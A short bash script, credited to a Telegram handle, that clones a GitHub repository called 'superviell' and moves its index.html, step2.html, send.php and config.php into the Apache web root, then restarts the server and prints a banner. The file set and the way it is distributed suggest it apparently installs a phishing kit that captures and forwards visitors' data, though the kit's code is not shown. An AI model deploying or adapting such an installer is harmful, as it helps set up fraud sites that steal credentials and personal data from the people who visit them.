#!/bin/bash
#
# Created by: @K41S3RR - https://t.me/K41S3RR
#
# ==============================================
cd /etc/apache2/sites-available; nano 000-default.conf
cd /var/www; git clone https://github.com/resekk-vps/superviell
cd /var/www/superviell; mv index_files /var/www; mv step2.html /var/www; mv config.php /var/www; mv index.html /var/www; mv send.php /var/www
cd /var/www; nano config.php
cd /root; sudo service apache2 restart
#BANNER
clear && clear; cowsay -f eyes "SCRIPT FINALIZADA" | lolcat && figlet -f slant "RESEKK VPS" | lolcat
